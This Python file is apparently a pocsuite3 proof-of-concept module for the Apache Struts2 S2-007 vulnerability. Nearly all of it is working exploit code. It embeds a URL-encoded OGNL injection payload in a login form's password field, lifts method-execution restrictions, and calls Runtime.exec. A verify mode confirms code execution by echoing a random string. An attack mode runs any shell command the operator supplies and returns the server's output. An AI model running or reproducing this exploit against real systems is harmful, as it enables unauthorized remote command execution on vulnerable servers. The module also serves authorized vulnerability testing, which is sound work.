from collections import OrderedDict
from urllib.parse import quote

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests
from pocsuite3.lib.core.interpreter_option import OptString
from pocsuite3.lib.utils import random_str


class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['sunflower']
    vulDate = '2023-11-15'
    createDate = '2023-11-15'
    updateDate = '2023-11-15'
    references = ['']
    name = ''
    appPowerLink = ''
    appName = 'struts2'
    appVersion = ''
    vulType = ''
    desc = '''S2-007:影响版本Struts 2.0.0-2.2.3;'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString('', description="可执行的shell命令")
        return o

    def _verify(self):
        result = {}
        hash_str = random_str(10)
        exec_payload = "'%20%2B%20(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream()))%20%2B%20'"
        headers = {}
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        headers["Connection"] = "close"
        command = [
            "echo " + hash_str,
            "cmd.exe /c echo " + hash_str
        ]
        for cmd in command:
            data = "username=test&password={exp}"
            data = data.format(exp=exec_payload.format(cmd=quote(cmd)))
            html = requests.post(self.url, data=data, headers=headers).text

            if hash_str in html:
                result["VerifyInfo"] = {
                    "URL": self.url,
                    "PAYLOAD": data
                }

                return self.parse_output(result)

    def _attack(self):
        result = {}
        exec_payload = "'%20%2B%20(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream()))%20%2B%20'"
        headers = {}
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        headers["Connection"] = "close"
        command = self.get_option("command")

        data = "username=test&password={exp}"
        data = data.format(exp=exec_payload.format(cmd=quote(command)))
        html = requests.post(self.url, data=data, headers=headers).text

        result["VerifyInfo"] = {
            "URL": self.url,
            "PAYLOAD": data,
            "HTML": html
        }

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
